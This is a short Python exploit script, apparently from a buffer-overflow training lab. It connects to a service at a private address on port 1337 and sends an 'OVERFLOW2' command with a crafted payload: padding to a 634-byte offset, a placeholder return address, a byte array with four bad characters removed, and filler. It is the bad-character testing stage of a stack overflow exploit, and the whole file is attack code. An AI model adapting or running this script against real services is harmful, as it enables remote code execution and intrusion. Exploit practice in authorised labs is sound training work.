#!/usr/bin/env python3

import socket, struct
host, port = '10.10.100.108', 1337
command = b'OVERFLOW2 '
offset = 634
length = 1000
new_eip = b'BBBB'
all_chars = bytearray(range(1,256))
bad_chars = [
b'\x23',
b'\x3c',
b'\x83',
b'\xba'
]


for bad_char in bad_chars:
        all_chars = all_chars.replace(bad_char, b'')

payload = b''.join(
        [
        command,
        b'A' * offset,
        new_eip,
        all_chars,
        b'C' * (length - len(new_eip) - offset - len(all_chars)),
        ])

with socket.socket() as s:
        s.connect((host, port))
        s.send(payload)
